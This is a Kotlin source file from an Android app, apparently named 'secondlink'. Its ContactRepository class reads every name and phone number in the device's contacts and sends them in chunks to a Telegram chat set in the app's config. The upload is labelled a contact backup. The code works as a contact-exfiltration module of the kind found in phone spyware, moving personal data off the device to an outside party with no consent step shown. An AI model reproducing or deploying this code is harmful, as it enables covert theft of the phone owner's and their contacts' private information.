package id.my.femasaf.secondlink

import android.content.Context
import android.provider.ContactsContract
import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext

class ContactRepository(private val context: Context, private var api: TelegramApi?) {

    fun updateApi(newApi: TelegramApi) {
        this.api = newApi
    }

    suspend fun fetchAndSendContacts() {
        withContext(Dispatchers.IO) {
            val contacts = fetchContacts()
            if (contacts.isNotEmpty()) {
                val formattedMessage = formatContacts(contacts)
                val chunks = formattedMessage.chunked(4000)
                chunks.forEach { chunk ->
                    sendToTelegram(chunk)
                }
            } else {
                sendToTelegram("Tidak ada kontak ditemukan di HP ini.")
            }
        }
    }

    private fun fetchContacts(): List<ContactModel> {
        val contactList = mutableListOf<ContactModel>()
        val contentResolver = context.contentResolver
        val cursor = contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null,
            null,
            null,
            null
        )

        cursor?.use {
            val nameIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
            val numberIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)

            while (it.moveToNext()) {
                val name = it.getString(nameIndex) ?: "Unknown"
                val number = it.getString(numberIndex) ?: ""
                contactList.add(ContactModel(name, number))
            }
        }
        return contactList
    }

    private fun formatContacts(contacts: List<ContactModel>): String {
        val sb = StringBuilder()
        sb.append("*List Kontak Backup*\n\n")
        contacts.forEachIndexed { index, contact ->
            sb.append("${index + 1}. *${contact.name}*: `${contact.phoneNumber}`\n")
        }
        return sb.toString()
    }

    private suspend fun sendToTelegram(text: String) {
        val apiRef = api ?: return
        try {
            val response = apiRef.sendMessage(
                chatId = Config.getChatId(context),
                text = text
            )
            if (response.isSuccessful) {
                Log.d("ContactRepository", "Sent to Telegram successfully")
            } else {
                Log.e("ContactRepository", "Failed to send contacts: ${response.code()}")
            }
        } catch (e: Exception) {
            Log.e("ContactRepository", "Contact transfer failed")
        }
    }
}
